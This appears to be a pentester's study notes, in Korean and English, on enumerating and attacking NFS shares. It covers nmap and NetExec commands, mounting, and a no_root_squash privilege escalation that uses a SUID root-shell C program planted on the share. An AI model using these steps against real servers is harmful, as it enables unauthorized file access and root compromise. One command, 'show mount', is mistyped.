### Tips

- 만약 mount한 share에 `permission denied` 에러가 발생한다면, `sudo su`로 escalate 후에 다시 시도
- NFS has the same purpose as `SMB` . However, it uses an entirely different protocol.
- NFS is used between Linux and Unix systems, which means NFS clients cannot directly communicate with SMB servers.

### Nmap NSE

```bash
nmap $IP --script=nfs-ls,nfs-statfs,nfs-showmount -p 111
```

### List Shares

```powershell
show mount -e $IP
```

### NetExec

```powershell
nxc nfs $IP --enum-shares

# root escape
nxc nfs $IP --ls '/'
nxc nfs $IP --get-file /home/wook/test.txt
nxc nfs $IP --put-file test.txt /home/hari/

```

### Mount

```bash
rpcinfo -p $IP
showmount -e $IP
mkdir /mnt/wookNFS
sudo mount -t nfs $IP:/ /mnt/wookNFS -o nolock
cd wookNFS
tree .
```

### Unmount

```bash
sudo umount /mnt/wookNFS

# Force unmount = lazy
sudo umount -l wookNFS

# 마운트 디렉토리를 사용하는 프로세스 확인
lsof +d wookNFS
```

### no_root_squash

NFS 서버의 기본 설정은 `root squash`다. `root squash`는 NFS 클라이언트에서 `root` 사용자가 공유 폴더에 접근할 때, `root` 사용자의 권한을 NFS 서버에서는 낮은 권한의 사용자 (`nfsnobody`)로 변환하는 기능이다. 즉, 클라이언트의 `root` 사용자가 공유 폴더에 파일을 생성하거나 수정하려 해도, 서버에서는 일반 사용자 권한으로 처리되기 때문에 서버의 실제 `root` 파일이나 시스템을 조작할 수 없다.

```bash
#1 NFS 공유 폴더에서 no_root_squash 옵션이 있는 폴더를 찾는다
showmount -e $IP

#2 공유 폴더 마운트
mkdir wookNFS
sudo mount -t nfs $IP:/ wookNFS -o nolock
cd wookNFS
tree .

#3 SUID 비트가 설정된 악성 파일 생성
#3-1 가장 쉬운 방법은 /bin/bash 같은 쉘 프로그램을 복사해 SUID 비트를 설정하는 것
int main()
{
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}

gcc nfs.c -o nfs -w
chmod +s nfs

#4 NFS 서버에서 악성 파일 실행
```

### **Default Configuration**

```bash
/etc/exports
```

| **Option** | **Description** |
| --- | --- |
| `rw` | Read and write permissions. |
| `ro` | Read only permissions. |
| `sync` | Synchronous data transfer. (A bit slower) |
| `async` | Asynchronous data transfer. (A bit faster) |
| `secure` | Ports above 1024 will not be used. |
| `insecure` | Ports above 1024 will be used. |
| `no_subtree_check` | This option disables the checking of subdirectory trees. |
| `root_squash` | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |